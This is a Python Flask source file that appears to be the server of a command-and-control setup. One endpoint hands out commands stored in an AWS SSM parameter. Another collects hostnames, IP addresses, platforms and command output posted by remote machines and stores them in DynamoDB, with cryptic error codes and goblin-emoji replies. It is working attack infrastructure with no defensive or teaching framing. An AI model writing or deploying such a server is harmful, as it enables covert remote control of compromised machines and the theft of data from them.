# app.py

from flask import Flask
from flask import jsonify
from flask import request
import os
import boto3

from uuid import uuid4

app = Flask(__name__)

dynamo_table = os.environ['USERS_TABLE']
param_name = os.environ['PARAM_NAME']
    


def current_command():
    client = boto3.client('ssm')
    param = client.get_parameter(
        Name=param_name
    )
    return param['Parameter']['Value']


@app.route("/q")
def question():
    return jsonify({"command": current_command()})

@app.route("/a", methods=["POST"])
def answer():
    hostname = request.json.get('hostname', 'n/a')
    ip_addr = request.json.get('ip', 'n/a')
    response = request.json.get('response', 'n/a')
    platform = request.json.get('platform', 'n/a')
    if not hostname or not ip_addr or not response:
        return jsonify({"error": "0x4452"})
    try:
        client = boto3.client('dynamodb')
        resp = client.put_item(
            TableName=dynamo_table,
            Item={
                "uuid": {'S': str(uuid4())},
                "IpAddress": {'S': ip_addr},
                "CommandResp": {'S': response},
                "Hostname": {'S': hostname},
                "Platform": {'S': platform}
            }
        )
        return jsonify({"operation_outcome": "success 👺"})
    except Exception:
        return jsonify({"operation_outcome": "failure 👺"})

